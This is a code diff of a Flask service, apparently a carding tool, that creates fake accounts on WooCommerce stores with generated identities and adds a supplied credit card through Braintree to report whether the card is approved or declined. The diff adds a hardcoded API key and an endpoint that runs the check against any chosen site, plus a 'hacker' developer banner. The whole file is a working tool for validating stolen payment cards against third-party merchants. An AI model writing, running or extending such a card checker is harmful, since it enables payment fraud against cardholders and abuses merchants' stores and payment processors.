@@ -34,6 +34,8 @@ fake = Faker('en_US')
 # CONFIGURATION
 # ============================================================
 
+API_KEY = "md-tech1"
+
 # URL patterns to try for each site
 URL_PATTERNS = [
     {
@@ -55,20 +57,6 @@ URL_PATTERNS = [
         'register_url': '/account/register/',
         'address_url': '/account/edit-address/billing/',
         'payment_url': '/account/add-payment-method/',
-        'payment_method': 'braintree_credit_card'
-    },
-    {
-        'name': 'WooCommerce Register',
-        'register_url': '/wp-login.php?action=register',
-        'address_url': '/my-account/edit-address/billing/',
-        'payment_url': '/my-account/add-payment-method/',
-        'payment_method': 'braintree_credit_card'
-    },
-    {
-        'name': 'Checkout Register',
-        'register_url': '/checkout/',
-        'address_url': '/my-account/edit-address/billing/',
-        'payment_url': '/my-account/add-payment-method/',
         'payment_method': 'braintree_credit_card'
     }
 ]
@@ -279,10 +267,7 @@ class SmartBraintreeChecker:
                 f"{self.base_url}{self.detected_config['register_url']}",
                 f"{self.base_url}/my-account/",
                 f"{self.base_url}/customer-account/?action=register",
-                f"{self.base_url}/account/register/",
-                f"{self.base_url}/wp-login.php?action=register",
-                f"{self.base_url}/checkout/",
-                f"{self.base_url}/register/"
+                f"{self.base_url}/account/register/"
             ]
             
             html = None
@@ -292,9 +277,7 @@ class SmartBraintreeChecker:
             for reg_url in reg_urls:
                 try:
                     success, test_html = await self.get_page(reg_url)
-                    if success and ('woocommerce-register-nonce' in test_html or 
-                                  'wp-login.php?action=register' in reg_url or
-                                  'checkout' in reg_url):
+                    if success and 'woocommerce-register-nonce' in test_html:
                         html = test_html
                         working_reg_url = reg_url
                         logger.info(f"Found registration form at: {reg_url}")
@@ -306,13 +289,6 @@ class SmartBraintreeChecker:
                 return False, "No registration form found"
             
             tokens = self.extract_tokens(html)
-            if not tokens.get('register_nonce'):
-                # Try to find other registration tokens
-                if 'woocommerce-login-nonce' in html:
-                    tokens['register_nonce'] = tokens['login_nonce']
-                elif 'woocommerce-edit-address-nonce' in html:
-                    tokens['register_nonce'] = tokens['edit_address_nonce']
-            
             if not tokens.get('register_nonce'):
                 return False, "No registration token found"
             
@@ -339,19 +315,7 @@ class SmartBraintreeChecker:
                 form_data['password'] = user_data['password']
             
             if 'name="email_2"' in html:
-                form_data['email_2'] = user_data['email']
-            
-            if 'name="first_name"' in html:
-                form_data['first_name'] = user_data['first_name']
-            
-            if 'name="last_name"' in html:
-                form_data['last_name'] = user_data['last_name']
-            
-            if 'name="billing_first_name"' in html:
-                form_data['billing_first_name'] = user_data['first_name']
-            
-            if 'name="billing_last_name"' in html:
-                form_data['billing_last_name'] = user_data['last_name']
+                form_data['email_2'] = ''
             
             # Add WooCommerce attribution
             form_data.update({
@@ -371,9 +335,7 @@ class SmartBraintreeChecker:
                 final_url = str(response.url)
                 
                 # Check multiple success indicators
-                success_indicators = ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address', 
-                                   'account-created', 'registration-completed']
-                if any(x in result for x in success_indicators):
+                if any(x in result for x in ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address']):
                     if 'login' not in final_url.lower() or 'my-account' in final_url.lower():
                         logger.info("Registration successful")
                         return True, user_data
@@ -382,12 +344,6 @@ class SmartBraintreeChecker:
                 if 'already registered' in result.lower() or 'already exists' in result.lower():
                     logger.info("Account exists, trying different email")
                     # Generate new email and retry once
-                    user_data['email'] = f"{fake.first_name().lower()}{random.randint(1000,9999)}@gmail.com"
-                    return await self.register_account(user_data)
-                
-                # Check for specific error messages
-                if 'invalid email' in result.lower() or 'email is invalid' in result.lower():
-                    logger.info("Invalid email format, trying different email")
                     user_data['email'] = f"{fake.first_name().lower()}{random.randint(1000,9999)}@gmail.com"
                     return await self.register_account(user_data)
                 
@@ -405,29 +361,9 @@ class SmartBraintreeChecker:
             edit_url = f"{self.base_url}{self.detected_config['address_url']}"
             success, html = await self.get_page(edit_url)
             if not success:
-                # Try alternative address URLs
-                alt_urls = [
-                    f"{self.base_url}/my-account/edit-address/",
-                    f"{self.base_url}/customer-account/edit-address/",
-                    f"{self.base_url}/account/edit-address/"
-                ]
-                for alt_url in alt_urls:
-                    success, html = await self.get_page(alt_url)
-                    if success:
-                        edit_url = alt_url
-                        break
-                
-                if not success:
-                    return False, "Address page not accessible"
+                return False, "Address page not accessible"
             
             tokens = self.extract_tokens(html)
-            if not tokens.get('edit_address_nonce'):
-                # Try to find other address tokens
-                if 'woocommerce-login-nonce' in html:
-                    tokens['edit_address_nonce'] = tokens['login_nonce']
-                elif 'woocommerce-register-nonce' in html:
-                    tokens['edit_address_nonce'] = tokens['register_nonce']
-            
             if not tokens.get('edit_address_nonce'):
                 return False, "No address token"
             
@@ -459,7 +395,7 @@ class SmartBraintreeChecker:
             
             async with self.session.post(edit_url, headers=headers, data=data_str) as response:
                 result = await response.text()
-                if "successfully" in result.lower() or "changed" in result.lower() or "updated" in result.lower():
+                if "successfully" in result.lower() or "changed" in result.lower():
                     logger.info("Address updated")
                     return True, "Success"
                 return False, "Failed"
@@ -489,14 +425,6 @@ class SmartBraintreeChecker:
             # Check text content
             if 'payment method was successfully added' in result.lower():
                 return "Approved: Payment method added"
-            
-            # Check for specific Braintree errors
-            if 'credit card type is not accepted' in result.lower():
-                return "Declined: Credit card type not accepted"
-            if 'verifications are not supported' in result.lower():
-                return "Declined: Verifications not supported"
-            if 'addresses must have at least one field filled in' in result.lower():
-                return "Declined: Address validation failed"
             
             return "Unknown Response"
         except:
@@ -754,18 +682,18 @@ async def test_card_on_site(domain, cc):
     # Validate card
     is_valid, msg = validate_cc(cc)
     if not is_valid:
-        return {"status": "declined", "response": f"Invalid card: {msg}", "site": domain}
+        return {"Status": "Declined", "Response": f"Invalid card: {msg}", "Site": domain}
     
     try:
         async with SmartBraintreeChecker(domain) as checker:
             result = await checker.complete_workflow(cc)
             
             if result.get('success'):
-                return {"status": "approved", "response": result['response'], "site": domain}
+                return {"Status": "Approved", "Response": result['response'], "Site": domain}
             else:
-                return {"status": "declined", "response": result['response'], "site": domain}
+                return {"Status": "Declined", "Response": result['response'], "Site": domain}
     except Exception as e:
-        return {"status": "declined", "response": str(e)[:100], "site": domain}
+        return {"Status": "Declined", "Response": str(e)[:100], "Site": domain}
 
 # ============================================================
 # FLASK ROUTES
@@ -786,9 +714,16 @@ def home():
             <h2 style="color: #3498db;">API Endpoints:</h2>
             
             <div style="background: #0f3460; padding: 15px; margin: 15px 0; border-radius: 5px;">
-                <strong style="color: #2ecc71;">Multi-Site Test:</strong>
+                <strong style="color: #2ecc71;">Single Site Test:</strong>
                 <code style="display: block; background: #1a1a2e; padding: 10px; margin: 10px 0; border-radius: 3px; color: #f39c12;">
-                /gate=b3/cc=CARD
+                /gateway=AutoBraintree/key=md-tech1/site=DOMAIN/cc=CARD
+                </code>
+            </div>
+            
+            <div style="background: #0f3460; padding: 15px; margin: 15px 0; border-radius: 5px;">
+                <strong style="color: #2ecc71;">Multi-Site Test (16 sites):</strong>
+                <code style="display: block; background: #1a1a2e; padding: 10px; margin: 10px 0; border-radius: 3px; color: #f39c12;">
+                /gateway=AutoBraintree/key=md-tech1/cc=CARD
                 </code>
             </div>
             
@@ -798,15 +733,14 @@ def home():
                 <li>✅ Auto-detects payment method (braintree_credit_card or braintree_cc)</li>
                 <li>✅ Works on ANY WooCommerce Braintree site</li>
                 <li>✅ Fast parallel testing</li>
-                <li>✅ Improved registration logic</li>
             </ul>
             
             <h2 style="color: #3498db;">Response:</h2>
             <code style="display: block; background: #1a1a2e; padding: 15px; border-radius: 5px; color: #2ecc71;">
 {<br>
-&nbsp;&nbsp;"status": "approved/declined",<br>
-&nbsp;&nbsp;"response": "Message",<br>
-&nbsp;&nbsp;"site": "domain.com"<br>
+&nbsp;&nbsp;"Status": "Approved/Declined",<br>
+&nbsp;&nbsp;"Response": "Message",<br>
+&nbsp;&nbsp;"Site": "domain.com"<br>
 }
             </code>
             
@@ -816,9 +750,24 @@ def home():
     </html>
     """
 
-@app.route('/gate=b3/cc=<path:cc>')
-def gateway_multi(cc):
+@app.route('/gateway=AutoBraintree/key=<key>/site=<path:domain>/cc=<path:cc>')
+def gateway_single(key, domain, cc):
+    """Test card on single site with auto-detection"""
+    if key != API_KEY:
+        return jsonify({"Status": "Declined", "Response": "Invalid API key", "Site": "N/A"}), 401
+    
+    try:
+        result = asyncio.run(test_card_on_site(domain, cc))
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({"Status": "Declined", "Response": str(e)[:100], "Site": domain}), 500
+
+@app.route('/gateway=AutoBraintree/key=<key>/cc=<path:cc>')
+def gateway_multi(key, cc):
     """Test card on multiple default sites with auto-detection"""
+    if key != API_KEY:
+        return jsonify({"Status": "Declined", "Response": "Invalid API key", "Site": "N/A"}), 401
+    
     try:
         results = []
         for domain in DEFAULT_SITES:
@@ -826,15 +775,15 @@ def gateway_multi(cc):
                 result = asyncio.run(test_card_on_site(domain, cc))
                 results.append(result)
             except Exception as e:
-                results.append({"status": "declined", "response": str(e)[:100], "site": domain})
+                results.append({"Status": "Declined", "Response": str(e)[:100], "Site": domain})
         
         return jsonify(results)
     except Exception as e:
-        return jsonify([{"status": "declined", "response": str(e)[:100], "site": "All"}]), 500
+        return jsonify([{"Status": "Declined", "Response": str(e)[:100], "Site": "All"}]), 500
 
 @app.errorhandler(404)
 def not_found(error):
-    return jsonify({"status": "declined", "response": "Endpoint not found", "site": "N/A"}), 404
+    return jsonify({"Status": "Declined", "Response": "Endpoint not found", "Site": "N/A"}), 404
 
 # ============================================================
 # RUN SERVER
@@ -847,7 +796,7 @@ if __name__ == "__main__":
 ╚════════════════════════════════════════════════════════════╝
 
 🚀 Server: http://localhost:8000/
-🔑 API Key: None (public access)
+🔑 API Key: md-tech1
 
 ✨ SMART AUTO-DETECT FEATURES:
 ──────────────────────────────
@@ -856,20 +805,24 @@ if __name__ == "__main__":
 ✅ Automatically tries /account/ URLs
 ✅ Automatically detects payment method type
 ✅ Works on ANY WooCommerce Braintree site!
-✅ Improved registration logic
 
 ENDPOINTS:
 ──────────
+Single Site (ANY site):
+http://localhost:8000/gateway=AutoBraintree/key=md-tech1/site=ANYSITE.com/cc=CARD
+
 Multi Site:
-http://localhost:8000/gate=b3/cc=CARD
+http://localhost:8000/gateway=AutoBraintree/key=md-tech1/cc=CARD
 
 OUTPUT:
 ───────
 {
-  "status": "approved/declined",
-  "response": "Message",
-  "site": "domain.com"
+  "Status": "Approved/Declined",
+  "Response": "Message",
+  "Site": "domain.com"
 }
+👨🏻‍💻 DEV -『⛥ 𝗠𝗗 𝗧𝗘𝗖𝗛 𝗛𝗔𝗖𝗞𝗘𝗥 ⛥』
+════════════════════════════════════════════════════════════
     """)
     
     app.run(host='0.0.0.0', port=8000, debug=False, threaded=True)
